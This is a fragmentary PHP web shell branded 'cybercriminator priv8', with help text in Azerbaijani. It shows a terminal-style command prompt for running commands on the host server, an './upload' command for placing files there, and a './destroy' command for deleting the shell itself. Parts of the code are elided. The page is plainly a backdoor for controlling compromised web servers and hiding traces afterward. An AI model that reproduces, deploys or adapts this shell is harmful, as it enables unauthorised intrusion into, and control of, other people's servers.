...
<html>
<head>
	<title>$ cybercriminator priv8 $</title>
	<meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="author" content="CyberCriminator">
</head>
<body>
<style> 
body 
{ 
background-image: 
url(https://cdn.miscellaneoushi.com/1920x1280/20190421/5cbc7c20e4f3e.jpg); 
background-repeat: repeat- 
y 
} 
</style>
<!--background:#333 -->
<style type="text/css">html,body{color: darkred;}input{color:#eee;background: transparent;border:0;padding:6px}.content{width:70%;margin: 0 auto;}</style>
...
<div class="content">
<div id="head">
<center><a href="?" style="text-decoration: none;color: #eee"><h1>$ cybercriminator priv8 $</h1></a></center>
<hr>
</div>
<?php
...
if($cmd == "--help" || $cmd == "-h")
{
$help = array("./upload" => "Faylları serverə yükləmək üçün.",
			  "./destroy" => "Bu faylı silmək üçün. (".$_SERVER['PHP_SELF'].") ");

echo "[+] Addtional command [CyberCriminator] <br><br>";
foreach($help as $h=>$k)
{
...
{
	?>CyberCriminator@<?=$_SERVER['HTTP_HOST'];?> $<input type="text" name="command" placeholder="Sizin üçün nə edə bilərəm? --help" id="command" style="width:80%" onchange="s57_runCommand(this.value)">
<?php
}else{
